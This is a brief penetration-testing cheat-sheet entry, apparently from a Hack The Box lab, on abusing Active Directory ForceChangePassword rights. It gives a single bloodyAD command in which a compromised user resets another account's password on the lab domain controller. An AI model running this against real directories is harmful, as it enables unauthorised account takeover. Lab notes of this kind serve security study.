# AD Force Change Password

> Pwned User has the ability to change the target users password without know that users current password

## Using BloodyAD
```bash
# Kerberos Auth
bloodyAD --host "dc01.scepter.htb" -d "scepter.htb" -u "d.baker" -k set password "a.carter" "H@ckM3#"
```
